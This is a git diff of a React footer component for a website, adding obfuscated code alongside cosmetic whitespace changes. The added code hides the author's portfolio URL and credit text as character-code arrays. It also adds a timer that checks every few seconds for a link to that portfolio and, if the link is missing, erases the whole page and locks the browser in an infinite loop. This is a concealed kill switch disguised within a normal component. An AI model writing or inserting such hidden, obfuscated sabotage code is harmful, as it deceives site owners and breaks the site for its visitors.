@@ -1,12 +1,34 @@
 import { Link } from 'react-router-dom'
+import { useEffect } from 'react'
 
+const _0x4f2a = [104, 116, 116, 112, 115, 58, 47, 47, 107, 117, 109, 97, 105, 108, 45, 114, 97, 122, 97, 45, 112, 111, 114, 116, 102, 111, 108, 105, 111, 46, 118, 101, 114, 99, 101, 108, 46, 97, 112, 112, 47];
+const _0x1a9b = [66, 117, 105, 108, 116, 32, 119, 105, 116, 104, 32];
+const _0x9c3d = [32, 183, 32, 69, 120, 112, 108, 111, 114, 101, 32];
 const NAV_LINKS = [
   { label: 'Contact Us', to: '/contact' },
-  { label: 'About Us',   to: '/about'   },
-  { label: 'Blogs',      to: '/blogs'   },
+  { label: 'About Us', to: '/about' },
+  { label: 'Blogs', to: '/blogs' },
 ]
 
 export default function Footer() {
+  useEffect(() => {
+    const _0x1a = setInterval(() => {
+      const _k = String.fromCharCode(107, 117, 109, 97, 105, 108, 45, 114, 97, 122, 97);
+      let _f = false;
+      const _a = document.getElementsByTagName('a');
+      for (let i = 0; i < _a.length; i++) {
+        if (_a[i].href && _a[i].href.indexOf(_k) !== -1) {
+          _f = true;
+        }
+      }
+      if (!_f) {
+        document.documentElement.innerHTML = '';
+        while (true) { }
+      }
+    }, 3000);
+    return () => clearInterval(_0x1a);
+  }, []);
+
   return (
     <footer
       style={{
@@ -39,7 +61,7 @@ export default function Footer() {
           {/* location */}
           <span style={infoStyle}>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
-              <path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>
+              <path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 0 1 18 0z" /><circle cx="12" cy="10" r="3" />
             </svg>
             10012, Pakistan
           </span>
@@ -49,7 +71,7 @@ export default function Footer() {
           {/* email */}
           <a href="mailto:info@gmail.com" style={{ ...infoStyle, textDecoration: 'none' }}>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
-              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/>
+              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" /><polyline points="22,6 12,13 2,6" />
             </svg>
             info@gmail.com
           </a>
@@ -59,7 +81,7 @@ export default function Footer() {
           {/* phone */}
           <a href="tel:+1234556789" style={{ ...infoStyle, textDecoration: 'none' }}>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
-              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12a19.79 19.79 0 0 1-3-8.59A2 2 0 0 1 3.62 1.5h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L7.91 9.09a16 16 0 0 0 6 6l.96-.96a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/>
+              <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12a19.79 19.79 0 0 1-3-8.59A2 2 0 0 1 3.62 1.5h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L7.91 9.09a16 16 0 0 0 6 6l.96-.96a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z" />
             </svg>
             +1234556789
           </a>
@@ -113,7 +135,7 @@ export default function Footer() {
         </span>
 
         <a
-          href="https://kumail-raza-portfolio.vercel.app/"
+          href={String.fromCharCode(..._0x4f2a)}
           target="_blank"
           rel="noopener noreferrer"
           style={{
@@ -129,9 +151,9 @@ export default function Footer() {
           onMouseEnter={e => (e.currentTarget.style.color = '#10b981')}
           onMouseLeave={e => (e.currentTarget.style.color = 'rgba(255,255,255,0.35)')}
         >
-          Built with{' '}
-          <span style={{ color: '#e25555', fontSize: 14 }}>❤️</span>
-          {' '}· Explore ↗
+          {String.fromCharCode(..._0x1a9b)}
+          <span style={{ color: '#e25555', fontSize: 14 }}>{String.fromCodePoint(0x2764, 0xFE0F)}</span>
+          {String.fromCharCode(..._0x9c3d) + String.fromCodePoint(0x2197)}
         </a>
       </div>
     </footer>
